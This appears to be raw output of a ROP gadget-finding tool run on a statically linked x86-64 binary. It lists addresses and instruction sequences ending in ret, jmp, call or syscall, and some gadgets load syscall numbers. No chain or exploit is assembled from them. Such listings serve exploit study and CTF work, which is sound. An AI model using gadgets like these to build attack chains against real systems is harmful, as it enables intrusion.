0x00000000004abe63 : add byte ptr [rax], cl ; add eax, 0x92c80000 ; cmc ; call qword ptr [rdx]
0x000000000048ba8e : add byte ptr [rax], cl ; mov byte ptr [rip + 0x230719], 8 ; ret
0x000000000048ba95 : add byte ptr [rax], cl ; ret
0x00000000004b4abf : add byte ptr [rax], dh ; add al, 0xfd ; jmp qword ptr [rdx]
0x0000000000494f78 : add byte ptr [rax], dh ; cli ; push qword ptr [rax + 0x2f] ; cli ; jmp rsi
0x00000000004b318b : add byte ptr [rax], dh ; js 0x4b3197 ; add byte ptr [rax], al ; adc edi, esp ; jmp qword ptr [rax]
0x00000000004afccf : add byte ptr [rax], dh ; mov edi, ecx ; call qword ptr [rbx]
0x0000000000494260 : add byte ptr [rax], dh ; stc ; jmp qword ptr [rax]
0x00000000004b198f : add byte ptr [rax], dh ; xchg eax, ebp ; cli ; call qword ptr [rdx]
0x00000000004ab9ab : add byte ptr [rax], dl ; add byte ptr [rax], al ; mov al, 0x51 ; cmc ; call qword ptr [rbx]
0x00000000004b2e0f : add byte ptr [rax], dl ; sti ; sti ; jmp qword ptr [rbx]
0x0000000000451314 : add byte ptr [rax], r8b ; add al, ch ; ret
0x00000000004b0910 : add byte ptr [rax], r8b ; add byte ptr [rax - 0x37ffffb1], bh ; retf 0xfff9
0x000000000044bb1d : add byte ptr [rax], r8b ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004b07c5 : add byte ptr [rax], r8b ; call 0x134b0192
0x00000000004138bd : add byte ptr [rax], r8b ; call 0x4131b9
0x000000000042403d : add byte ptr [rax], r8b ; mov eax, 0x16 ; ret
0x000000000044af4d : add byte ptr [rax], r8b ; mov eax, 0x1c ; syscall
0x000000000047566d : add byte ptr [rax], r8b ; mov eax, 0x66 ; syscall
0x000000000044af1d : add byte ptr [rax], r8b ; mov eax, 0xa ; syscall
0x00000000004190cd : add byte ptr [rax], r8b ; mov eax, 0xffffffff ; ret
0x0000000000418c3d : add byte ptr [rax], r8b ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x0000000000444a8d : add byte ptr [rax], r8b ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000444acd : add byte ptr [rax], r8b ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000420bb5 : add byte ptr [rax], r8b ; mov rsi, qword ptr [rsp + 0x68] ; call rax
0x0000000000400a95 : add byte ptr [rax], r8b ; pop rbp ; ret
0x0000000000484d2d : add byte ptr [rax], r8b ; pop rbx ; ret
0x0000000000400a5d : add byte ptr [rax], r8b ; ret
0x0000000000446e5d : add byte ptr [rax], r8b ; xor eax, eax ; ret
0x0000000000449ec6 : add byte ptr [rbp + 0x10], dh ; add rsp, 0x28 ; ret
0x000000000048513f : add byte ptr [rbp + 0x12], dh ; add rsp, 0x38 ; ret
0x000000000048e1b3 : add byte ptr [rbp + 0x1a], dh ; ret
0x00000000004759fd : add byte ptr [rbp + 0x1b], dh ; add rsp, 0x38 ; ret
0x00000000004490de : add byte ptr [rbp + 0x23], dh ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000481f64 : add byte ptr [rbp + 0x27], dh ; add rsp, 0x68 ; ret
0x0000000000481ea4 : add byte ptr [rbp + 0x2c], dh ; add rsp, 0x38 ; ret
0x000000000047fda3 : add byte ptr [rbp + 0x2d], dh ; call qword ptr [rip + 0x23cab4]
0x000000000041399a : add byte ptr [rbp + 0x31], al ; dec dword ptr [rax + 0x39] ; ret 0x860f
0x00000000004581f7 : add byte ptr [rbp + 0x31], al ; leave ; call r15
0x00000000004820c5 : add byte ptr [rbp + 0x36], dh ; add rsp, 0x78 ; ret
0x00000000004843d0 : add byte ptr [rbp + 0x3b], dh ; leave ; ret
0x000000000044afdf : add byte ptr [rbp + 0x41], bl ; pop rsp ; jmp rax
0x000000000044a0f6 : add byte ptr [rbp + 0x42], dh ; add rsp, 0x58 ; ret
0x00000000004758cb : add byte ptr [rbp + 0x45], dh ; add rsp, 0x58 ; ret
0x0000000000416cf7 : add byte ptr [rbp + 0x4a], dh ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x000000000044a486 : add byte ptr [rbp + 0x4a], dh ; add rsp, 0x68 ; ret
0x0000000000412fd7 : add byte ptr [rbp + 0x63], cl ; retf 0xc148
0x0000000000482fff : add byte ptr [rbp + 0xf], cl ; lodsd eax, dword ptr [rsi] ; ret
0x0000000000482eef : add byte ptr [rbp + 0xf], cl ; movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x000000000044adf5 : add byte ptr [rbp + 0xf], dh ; add rsp, 0x28 ; ret
0x000000000048849a : add byte ptr [rbp + 0xf], dh ; add rsp, 0x38 ; ret
0x000000000048790a : add byte ptr [rbp + 2], dh ; pop rbx ; ret
0x000000000045b56e : add byte ptr [rbp + 5], dh ; add rsp, 0x18 ; ret
0x000000000048505c : add byte ptr [rbp + 5], dh ; add rsp, 0x38 ; ret
0x000000000041a87f : add byte ptr [rbp + 6], dh ; add rsp, 0x20 ; pop rbx ; ret
0x000000000048d2e8 : add byte ptr [rbp + rax + 0x48], dh ; mov dword ptr [rdi + rsi*8], edx ; ret
0x000000000048d200 : add byte ptr [rbp + rbx + 0x48], dh ; add esp, 0x18 ; ret
0x00000000004b16b7 : add byte ptr [rbp + rbx*2], bl ; add byte ptr [rcx + rdi*2], ah ; cli ; call qword ptr [rdx]
0x000000000049f1b7 : add byte ptr [rbp + rcx + 0xdbf0000], bh ; add byte ptr [rax], al ; ret 0xd
0x000000000047801f : add byte ptr [rbp + rcx*4 + 0x2d], cl ; ret
0x000000000041f8db : add byte ptr [rbp + rcx*4 + 0x46], cl ; dec dword ptr [rax - 0x77] ; ret 0x2948
0x000000000047215e : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x10 ; mov rdi, r12 ; call rbx
0x0000000000472258 : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x18 ; mov rdi, r12 ; call rbx
0x0000000000472352 : add byte ptr [rbp + rcx*4 + 0x4d], cl ; ror byte ptr [rcx + rcx*4 - 1], 0x41 ; call rsp
0x000000000044d656 : add byte ptr [rbp + rcx*4 + 0xd], cl ; ret 0x26b3
0x000000000048587e : add byte ptr [rbp + rcx*4 + 4], cl ; retf 0x8b41
0x0000000000487d7c : add byte ptr [rbp + rcx*4 + 4], cl ; retf 0xba
0x00000000004b51db : add byte ptr [rbp + rsi - 3], al ; jmp rsp
0x0000000000490244 : add byte ptr [rbp - 0x1f], dh ; pop rbx ; ret
0x000000000044c57a : add byte ptr [rbp - 0x3dbbf040], al ; ret
0x000000000049f463 : add byte ptr [rbp - 0x3ffffff1], bh ; sldt word ptr [rax] ; ret
0x0000000000449737 : add byte ptr [rbp - 0x57c03b0], cl ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x0000000000495338 : add byte ptr [rbp - 0x5e6f0006], dh ; cli ; jmp qword ptr [rax]
0x0000000000486c04 : add byte ptr [rbp - 0x75], al ; or byte ptr [rbx + 0x394401c2], al ; retf 0x830f
0x0000000000482b7f : add byte ptr [rbp - 0x75], cl ; add byte ptr [rax - 0x75], cl ; push rsp ; retf 0x48f8
0x0000000000468db9 : add byte ptr [rbp - 0x75], cl ; je 0x468dea ; and byte ptr [rax + 1], cl ; ret
0x0000000000427b5d : add byte ptr [rbp - 0x77], cl ; retf
0x000000000044dce5 : add byte ptr [rbp - 0xcf98b40], al ; ret
0x000000000048f5d7 : add byte ptr [rbp - 0xcfb8b40], al ; ret
0x0000000000495240 : add byte ptr [rbp - 6], cl ; call qword ptr [rax]
0x00000000004942e0 : add byte ptr [rbp - 7], bl ; push qword ptr [rax + 0x5e] ; stc ; jmp rax
0x000000000043da59 : add byte ptr [rbx + 0x148b8104], cl ; xchg eax, ecx ; sub eax, edx ; ret
0x00000000004915d3 : add byte ptr [rbx + 0x22823a3d], cl ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000048543d : add byte ptr [rbx + 0x236d1c0d], cl ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x000000000047fe25 : add byte ptr [rbx + 0x23a3bb0d], al ; add byte ptr [rcx], al ; pop rbx ; ret
0x00000000004241bf : add byte ptr [rbx + 0x297c2a15], cl ; add bh, dh ; ret 0
0x0000000000420b2f : add byte ptr [rbx + 0x298cde3d], cl ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000419007 : add byte ptr [rbx + 0x2a2d0505], al ; add byte ptr [rcx], al ; ret
0x000000000041a5ff : add byte ptr [rbx + 0x31], bl ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x000000000045842b : add byte ptr [rbx + 0x41], bl ; pop rsp ; ret
0x0000000000444a9f : add byte ptr [rbx + 0x477880e], cl ; mov dword ptr [rdi], ecx ; ret
0x00000000004445cf : add byte ptr [rbx + 0x48028901], cl ; lea eax, [rdx + 3] ; ret
0x000000000043593f : add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x00000000004b545c : add byte ptr [rbx + 0x57f00000], bl ; std ; call qword ptr [rdx]
0x00000000004222bf : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000412ca8 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000414af4 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000405e91 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000041059b : add byte ptr [rbx + 0x5d], bl ; ret
0x000000000045a75f : add byte ptr [rbx + 0x63], cl ; xor al, 0x88 ; add rsi, r8 ; jmp rsi
0x000000000048f62f : add byte ptr [rbx + 0x75c08507], cl ; or dh, bl ; ret
0x000000000044b214 : add byte ptr [rbx + 0x94801e1], al ; retf 0x8949
0x0000000000473d9a : add byte ptr [rbx + rax - 0xd], dh ; ret
0x000000000048d2a7 : add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x00000000004ad4d7 : add byte ptr [rbx + rbx], bh ; add byte ptr [rbx + rdx*4], dh ; idiv bh ; retf
0x000000000045cdde : add byte ptr [rbx + rcx*4 + 0x2d], cl ; retf 0x25f1
0x00000000004845a7 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x00000000004883a7 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x00000000004ad4db : add byte ptr [rbx + rdx*4], dh ; idiv bh ; retf
0x00000000004add0b : add byte ptr [rbx + rsi*4 - 0xa], dl ; call qword ptr [rdi]
0x0000000000448ac8 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x10 ; pop rbx ; ret
0x0000000000448ad6 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x20 ; pop rbx ; ret
0x0000000000448acf : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x30 ; pop rbx ; ret
0x0000000000448ae4 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x40 ; pop rbx ; ret
0x0000000000448add : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x60 ; pop rbx ; ret
0x0000000000448ac1 : add byte ptr [rbx - 0x3d], bl ; mov eax, 8 ; pop rbx ; ret
0x0000000000471fa9 : add byte ptr [rbx - 0x3d], bl ; nop dword ptr [rax] ; ret
0x000000000046d02f : add byte ptr [rbx - 0x4f743], al ; jmp qword ptr [rax]
0x0000000000448d3e : add byte ptr [rbx - 0x50f0fe40], al ; ret 0xf8e9
0x000000000046603c : add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x0000000000446a86 : add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x0000000000406fd5 : add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x000000000040aaa1 : add byte ptr [rbx - 0x7bf0fc06], al ; retf 0xd
0x000000000040ad06 : add byte ptr [rbx - 0x7bf0fc08], al ; ret
0x0000000000409eb4 : add byte ptr [rbx - 0x7bf0fc08], al ; retf 6
0x00000000004114a8 : add byte ptr [rbx - 0x7bf0fd08], al ; ret
0x0000000000407d4c : add byte ptr [rbx - 0x7bf0fe02], al ; ret 0x1b
0x0000000000407102 : add byte ptr [rbx - 0x7bf0fe06], al ; retf
0x000000000040716e : add byte ptr [rbx - 0x7bf0fe07], al ; retf 0x1b
0x0000000000409f1f : add byte ptr [rbx - 0x7bf0fe08], al ; ret
0x0000000000409fc2 : add byte ptr [rbx - 0x7bf0fe08], al ; ret 4
0x0000000000413527 : add byte ptr [rbx - 0x7c2e76ed], cl ; retf 0x8320
0x000000000048f04f : add byte ptr [rbx - 0x7fbf8f19], al ; jmp qword ptr [rax]
0x000000000047b797 : add byte ptr [rbx], al ; add byte ptr [rax], al ; ret
0x0000000000494d30 : add byte ptr [rbx], bh ; cli ; call qword ptr [rax + 0x20fffa3a]
0x00000000004ac45c : add byte ptr [rbx], cl ; add byte ptr [rax], al ; sub byte ptr [rdx], 0xf6 ; call qword ptr [rax]
0x0000000000494a70 : add byte ptr [rbx], cl ; cli ; push qword ptr [rax + 0xa] ; cli ; jmp rax
0x00000000004a4f3f : add byte ptr [rbx], dh ; xchg ch, bh ; ljmp [rax + 0x73] ; std ; jmp qword ptr [rax]
0x00000000004b3190 : add byte ptr [rbx], dl ; cld ; jmp qword ptr [rax]
0x00000000004604ad : add byte ptr [rcx + 0x29], al ; retf 0x8944
0x00000000004672f5 : add byte ptr [rcx + 0x29], cl ; ret
0x000000000042ab75 : add byte ptr [rcx + 0x29], cl ; retf
0x0000000000411e9f : add byte ptr [rcx + 0x2b], cl ; adc byte ptr [r8 + 1], r9b ; ret
0x0000000000411e06 : add byte ptr [rcx + 0x2b], cl ; and byte ptr [r8 + 1], r9b ; ret
0x0000000000489b02 : add byte ptr [rcx + 0x348b4cd8], cl ; ret 0xf41
0x000000000047395f : add byte ptr [rcx + 0x39], cl ; ret
0x000000000041065d : add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; ret
0x0000000000419aa0 : add byte ptr [rcx + 0x4789246f], cl ; adc byte ptr [rbx + 0x5d], bl ; ret
0x0000000000413510 : add byte ptr [rcx + 0x5c], al ; pop r13 ; pop r14 ; ret
0x0000000000471aec : add byte ptr [rcx + 0x5d5b7453], cl ; pop r12 ; ret
0x000000000042e2de : add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, [r11 + rdx] ; jmp rdx
0x000000000048b146 : add byte ptr [rcx + 0x63], cl ; add al, 0x87 ; add rax, r15 ; jmp rax
0x000000000045ac5e : add byte ptr [rcx + 0x63], cl ; cmp al, 0xb3 ; add rdi, r11 ; jmp rdi
0x000000000042cb3c : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x0000000000444918 : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, [r11 + rcx] ; jmp rcx
0x0000000000460b19 : add byte ptr [rcx + 0x63], cl ; ret 0x8944
0x000000000046c8fa : add byte ptr [rcx + 0x63], cl ; ret 0x8948
0x0000000000485af6 : add byte ptr [rcx + 0xc8b48d8], cl ; ret 0xb60f
0x0000000000469608 : add byte ptr [rcx + 0xf], al ; mov dh, 0x46 ; or al, 0x83 ; ret
0x000000000046d894 : add byte ptr [rcx + 0xf], al ; ret 0x3941
0x0000000000461e3f : add byte ptr [rcx + 0xf], al ; ret 0xc839
0x0000000000466ea7 : add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x000000000046beba : add byte ptr [rcx + 1], al ; ret 0x8b48
0x000000000044718f : add byte ptr [rcx + 1], cl ; ret
0x000000000040e205 : add byte ptr [rcx + 1], cl ; ret 0x149
0x000000000048c395 : add byte ptr [rcx + 1], cl ; ret 0xef89
0x0000000000419a7d : add byte ptr [rcx + rax + 0x57], al ; sbb byte ptr [rax + 0x39], cl ; ret
0x00000000004022a2 : add byte ptr [rcx + rax - 0x18], cl ; jmp rax
0x00000000004758ac : add byte ptr [rcx + rbp - 0x48], dh ; add dword ptr [rcx], eax ; add byte ptr [rax], al ; syscall
0x00000000004b22e7 : add byte ptr [rcx + rbp*2 - 0x6dac0000], cl ; sti ; jmp qword ptr [rax]
0x00000000004173a4 : add byte ptr [rcx + rcx - 0xd], dh ; ret
0x0000000000403e10 : add byte ptr [rcx + rcx*4 + 0x54], al ; and al, 8 ; call 0x420108
0x000000000049218f : add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x0000000000473bbf : add byte ptr [rcx + rcx*4 - 0x40], cl ; vzeroupper ; ret
0x000000000048dd2f : add byte ptr [rcx + rcx*4 - 0xa], cl ; mov rdi, r12 ; call r15
0x00000000004918ef : add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x000000000042475f : add byte ptr [rcx + rcx*8 - 0x7cb7dd8c], al ; ret 0x4801
0x00000000004b4213 : add byte ptr [rcx + rcx*8 - 4], bh ; call rdx
0x00000000004b0fdb : add byte ptr [rcx + rcx], al ; cli ; jmp qword ptr [rdx]
0x000000000041ff58 : add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x41ff27 ; ret
0x00000000004b173b : add byte ptr [rcx + rdi*2 - 6], dl ; jmp rax
0x00000000004b16bb : add byte ptr [rcx + rdi*2], ah ; cli ; call qword ptr [rdx]
0x0000000000455d0f : add byte ptr [rcx - 0x46], al ; add eax, 0xe9000000 ; ret
0x000000000045b6e2 : add byte ptr [rcx - 0x46], al ; or byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, ecx ; syscall
0x000000000047f1ab : add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0x840f
0x000000000047f248 : add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0xc74
0x000000000040e277 : add byte ptr [rcx - 0x75], cl ; add byte ptr [r8 - 0x7d], r9b ; ret
0x000000000044bc2a : add byte ptr [rcx - 0x75], cl ; jge 0x44bc35 ; call r12
0x000000000044bc5a : add byte ptr [rcx - 0x75], cl ; jge 0x44bc65 ; call r12
0x000000000049229f : add byte ptr [rcx - 0x75], cl ; pop rax ; or byte ptr [rbp - 0x77], cl ; ret
0x000000000044c6e7 : add byte ptr [rcx - 0x77], al ; ret
0x000000000046c2be : add byte ptr [rcx - 0x77], al ; ret 0x1674
0x000000000046add7 : add byte ptr [rcx - 0x77], al ; retf
0x0000000000472862 : add byte ptr [rcx - 0x77], cl ; out 0xf7, al ; fucomi st(0) ; ret
0x0000000000458e9b : add byte ptr [rcx - 0x77], cl ; push rsi ; cmp byte ptr [rax - 0x3f], cl ; retf 0x6411
0x000000000045eaf7 : add byte ptr [rcx - 0x77], cl ; ret
0x00000000004048d0 : add byte ptr [rcx - 0x77], cl ; ret 0x149
0x0000000000491942 : add byte ptr [rcx - 0x77], cl ; ret 0x8349
0x0000000000479e14 : add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x000000000044c5ef : add byte ptr [rcx - 0x77], cl ; retf 0x19b8
0x000000000048aaca : add byte ptr [rcx - 0x77], cl ; ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x000000000048abd9 : add byte ptr [rcx - 0x7b], cl ; ret 0x840f
0x00000000004715ab : add byte ptr [rcx - 0x7cb7e8f4], cl ; ret 0x4804
0x000000000048addf : add byte ptr [rcx - 0x7d], al ; retf 0xb801
0x00000000004612d2 : add byte ptr [rcx - 0x7d], al ; retf 0xe9ff
0x000000000045bab7 : add byte ptr [rcx - 0x7d], cl ; call qword ptr [rbx]
0x000000000042ac0f : add byte ptr [rcx - 0x7d], cl ; jmp 0x42ac2b
0x000000000041d737 : add byte ptr [rcx - 0x7d], cl ; ret
0x0000000000419cbf : add byte ptr [rcx - 0x7d], cl ; ret 0x4908
0x000000000045bd2e : add byte ptr [rcx - 0x7d], cl ; ret 0x6601
0x000000000042699f : add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00000000004252af : add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x000000000044b1d2 : add byte ptr [rcx - 0x7d], cl ; retf
0x0000000000494324 : add byte ptr [rcx - 7], dh ; push rax ; jno 0x49432b ; jmp rax
0x000000000042c362 : add byte ptr [rcx - 9], cl ; ret 1
0x000000000042c388 : add byte ptr [rcx - 9], cl ; ret 2
0x0000000000456254 : add byte ptr [rcx], 0 ; add byte ptr [rax - 0x77], cl ; retf 0x8966
0x000000000048b59a : add byte ptr [rcx], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucomip st(1) ; ret
0x000000000044739f : add byte ptr [rcx], al ; add byte ptr [rax], al ; sub rax, rdx ; ret
0x000000000040ec7f : add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400b0b : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000047fe2b : add byte ptr [rcx], al ; pop rbx ; ret
0x000000000041900d : add byte ptr [rcx], al ; ret
0x000000000044dcfc : add byte ptr [rcx], bh ; ret
0x00000000004780cc : add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x000000000044aea5 : add byte ptr [rcx], dh ; inc dword ptr [rcx - 0x7d] ; retf 0x8940
0x000000000040ed94 : add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x000000000042bc6c : add byte ptr [rcx], dh ; rol bl, 0x83 ; ret 0x6620
0x0000000000475a3a : add byte ptr [rcx], dh ; ror byte ptr [rax + 0x39], 0xd7 ; ja 0x475a71 ; ret
0x0000000000482d1f : add byte ptr [rcx], dh ; ror byte ptr [rax + 0x39], cl ; call 0x490abf40
0x00000000004150cf : add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7b], 0xd2 ; jne 0x4150e9 ; ret
0x000000000044dd1b : add byte ptr [rcx], dh ; sar byte ptr [rcx], cl ; ret
0x00000000004001bb : add byte ptr [rdi + 0x4e], al ; push rbp ; add byte ptr [rsi], dh ; xor edi, ebp ; retf 0x6500
0x000000000043378a : add byte ptr [rdi + 0x63], cl ; or al, 0x8b ; add r9, r11 ; jmp r9
0x000000000048d015 : add byte ptr [rdi + 1], bh ; call r14
0x000000000048d03d : add byte ptr [rdi + 1], bh ; call rax
0x000000000048dd8c : add byte ptr [rdi + 2], dh ; sbb eax, eax ; ret
0x0000000000482577 : add byte ptr [rdi + rcx + 0x44], cl ; retf 0x8d48
0x000000000045a24f : add byte ptr [rdi + rcx - 0x42], cl ; retf 0x4a8d
0x0000000000463475 : add byte ptr [rdi + rcx - 0x4a], al ; or al, 0x89 ; ret 0xc689
0x00000000004b5107 : add byte ptr [rdi + rdx*4 + 0x33c40000], ch ; std ; jmp qword ptr [rdx]
0x0000000000494490 : add byte ptr [rdi - 0x3eff0007], bh ; stc ; inc dword ptr [rax] ; ret
0x0000000000494240 : add byte ptr [rdi], ah ; stc ; jmp qword ptr [rax]
0x0000000000494f08 : add byte ptr [rdi], bh ; cli ; call qword ptr [rax + 0x20fffa3e]
0x000000000040dc86 : add byte ptr [rdi], cl ; add eax, 0x8944c689 ; ret 0xeab8
0x0000000000481146 : add byte ptr [rdi], cl ; add eax, 0x940fc085 ; ret 0x3d
0x0000000000435106 : add byte ptr [rdi], cl ; cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x0000000000448997 : add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x000000000043613f : add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x00000000004361af : add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x0000000000454b9b : add byte ptr [rdi], cl ; mov dh, 0x4e ; add dword ptr [rcx - 0x77], eax ; retf
0x0000000000455ca4 : add byte ptr [rdi], cl ; mov dh, 0x78 ; add cl, byte ptr [rax + 0x39] ; retf
0x0000000000455c8f : add byte ptr [rdi], cl ; mov dh, 0x78 ; add dword ptr [rax + 0x39], ecx ; retf
0x0000000000455cb9 : add byte ptr [rdi], cl ; mov dh, 0x78 ; add ecx, dword ptr [rax + 0x39] ; retf
0x0000000000448a4f : add byte ptr [rdi], cl ; mov dh, 0xc1 ; pop rbx ; ret
0x000000000042654f : add byte ptr [rdi], cl ; mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000041351f : add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x000000000042c8cf : add byte ptr [rdi], cl ; mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x000000000042c40f : add byte ptr [rdi], cl ; mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x00000000004625db : add byte ptr [rdi], cl ; mov ds, word ptr [rax + rax + 0x63490000] ; ret 0x8944
0x000000000042bc9f : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x000000000042bccf : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x000000000042bcbf : add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x000000000042bcaf : add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x000000000046c8f4 : add byte ptr [rdi], cl ; mov ss, word ptr [rax + rax + 0x63490000] ; ret 0x8948
0x000000000047baf3 : add byte ptr [rdi], cl ; ret 0x8d48
0x000000000045919b : add byte ptr [rdi], cl ; ret 0xc083
0x00000000004656d3 : add byte ptr [rdi], cl ; retf 0x45e9
0x00000000004b0c17 : add byte ptr [rdi], cl ; stc ; hlt ; jmp qword ptr [rbx]
0x000000000042ab6f : add byte ptr [rdi], cl ; sub dword ptr [rsi + 0xe], 0 ; add byte ptr [rcx + 0x29], cl ; retf
0x000000000040dc6b : add byte ptr [rdi], cl ; sub dword ptr [rsp + 0xf0], eax ; syscall
0x00000000004119b6 : add byte ptr [rdi], cl ; test dword ptr [rcx - 0x16000002], esi ; retf 0xfffe
0x00000000004224ce : add byte ptr [rdi], cl ; test ebx, edi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000469a68 : add byte ptr [rdi], cl ; xchg dword ptr [rdx + rbx], esp ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000420f2e : add byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3d83
0x0000000000476933 : add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xc283
0x0000000000450164 : add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x000000000044458f : add byte ptr [rdx + 0x48028801], cl ; lea eax, [rdx] ; ret
0x0000000000442ddf : add byte ptr [rdx + 0x48028801], cl ; mov eax, edi ; ret
0x000000000048d217 : add byte ptr [rdx + 0x48], dh ; add esp, 0x18 ; ret
0x000000000047c22c : add byte ptr [rdx + 0x63], cl ; add al, 0xa1 ; add rax, rcx ; jmp rax
0x000000000047cb54 : add byte ptr [rdx + 0x63], cl ; add al, 0xa7 ; add rax, rdi ; jmp rax
0x00000000004851df : add byte ptr [rdx + 5], bh ; jmp 0x401c38
0x00000000004131b7 : add byte ptr [rdx + rax - 0xd], dh ; ret
0x00000000004afbef : add byte ptr [rdx + rax*2 - 0x77340000], dl ; stc ; call qword ptr [rdx]
0x00000000004afb77 : add byte ptr [rdx + rax*2], bl ; add byte ptr [rax], al ; hlt ; jg 0x4afb80 ; call rsp
0x00000000004ac473 : add byte ptr [rdx + rbp - 0xa], bh ; call qword ptr [rdx]
0x00000000004b1a33 : add byte ptr [rdx + rbx*4 - 6], ch ; call qword ptr [rcx]
0x000000000049edb7 : add byte ptr [rdx + rcx + 0xabf0000], bh ; add byte ptr [rax], al ; ret 0xa
0x0000000000457a60 : add byte ptr [rdx + rdi*2 - 0xa], dh ; ret
0x0000000000457a5f : add byte ptr [rdx + rdi*2 - 0xa], sil ; ret
0x0000000000494838 : add byte ptr [rdx + rdi*8], dl ; call qword ptr [rax + 0x26fffa13]
0x00000000004b22eb : add byte ptr [rdx + rdx*4 - 5], dl ; jmp qword ptr [rax]
0x0000000000494c74 : add byte ptr [rdx], cl ; cli ; push qword ptr [rax + 9] ; cli ; jmp rax
0x000000000044c787 : add byte ptr [rsi + 0x80], bh ; syscall
0x0000000000485372 : add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rax], al ; retf 0xf66
0x000000000042ce44 : add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000046351a : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x290f
0x0000000000463543 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x3e8
0x000000000041ac67 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x4466
0x000000000041a69f : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x8348
0x000000000046629a : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xace8
0x00000000004634e1 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x000000000046623c : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; sbb dword ptr [rsi + 0xf], esp ; outsd dx, dword ptr [rsi] ; retf
0x000000000042bbd4 : add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x000000000041ac66 : add byte ptr [rsi + 0xf], spl ; outsd dx, dword ptr [rsi] ; ret 0x4466
